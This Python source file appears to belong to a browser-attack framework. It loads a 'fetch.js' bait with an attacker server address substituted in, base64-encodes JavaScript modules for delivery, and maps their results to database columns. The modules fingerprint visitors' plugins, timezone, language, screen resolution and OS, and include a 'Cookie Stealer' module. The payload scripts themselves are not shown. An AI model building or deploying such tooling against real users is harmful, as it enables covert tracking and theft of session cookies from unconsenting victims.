from enum import Enum, nonmember
import base64
import pathlib

MODULES_PATH = "modules"
BAITS_PATH = "baits"

# Config consts
LAN_SERVER_ADDRESS_CONFIG = "127.0.0.1:5000"

class Parser:
    @classmethod
    def b64_encode(cls, path, **kwargs):
        with open(path, "r") as f:
            text = f.read()
            
            # Configuration file changes
            for find, replace in kwargs.items():
                find_marker = f"<{find}>"
                text = text.replace(find_marker, replace)

            encoded_text = base64.b64encode(text.encode()).decode()

        return encoded_text


class Bait(Enum):
    FETCH = "fetch.js"

    @classmethod
    def b64_encode(cls, bait: str, server_address = LAN_SERVER_ADDRESS_CONFIG):
        return Parser.b64_encode(
            f"{pathlib.Path(__file__).parent.resolve()}\\{BAITS_PATH}\\{bait}", 
            server_address=server_address
            )


class Module(Enum):
    BROWSER_PLUGINS = 'browser_plugins.js'
    TIMEZONE = 'timezone.js'
    LANGUAGE = 'language.js'
    SCREEN_RESOLUTION = 'screen_resolution.js'
    COOKIE_STEALER = 'cookie_stealer.js'
    OS = 'os.js'

    INFO_GATHERING_SUBCATEGORY = nonmember("info_gathering")

    module_to_sub_category = nonmember({
        BROWSER_PLUGINS : INFO_GATHERING_SUBCATEGORY,
        TIMEZONE : INFO_GATHERING_SUBCATEGORY,
        LANGUAGE : INFO_GATHERING_SUBCATEGORY,
        SCREEN_RESOLUTION : INFO_GATHERING_SUBCATEGORY,
        COOKIE_STEALER : INFO_GATHERING_SUBCATEGORY,
        OS : INFO_GATHERING_SUBCATEGORY
    })

    module_name_to_db_column = nonmember({
        BROWSER_PLUGINS : 'browser_plugins',
        TIMEZONE : 'timezone',
        LANGUAGE : 'language',
        SCREEN_RESOLUTION : 'screen_resolution',
        COOKIE_STEALER : 'cookies',
        OS : 'os'
    })

    module_name_to_display_name = nonmember({
        BROWSER_PLUGINS : 'Browser Plugins',
        TIMEZONE : 'Timezone',
        LANGUAGE : 'Language',
        SCREEN_RESOLUTION : 'Screen Resolution',
        COOKIE_STEALER : 'Cookie Stealer',
        OS : 'Operating System'
    })
    
    @classmethod
    def has_value(cls, value):
        return value in cls._value2member_map_ 
    
    @classmethod
    def b64_encode(cls, module_value: str):
        sub_category = cls.module_to_sub_category[module_value]
        return Parser.b64_encode(f"{pathlib.Path(__file__).parent.resolve()}\\{MODULES_PATH}\\{sub_category}\\{module_value}")
    
    @classmethod
    def get_module_as_db_column(cls, module_name):
        return cls.module_name_to_db_column[module_name]
    
    @classmethod
    def get_module_as_display_name(cls, module_name):
        return cls.module_name_to_display_name[module_name]

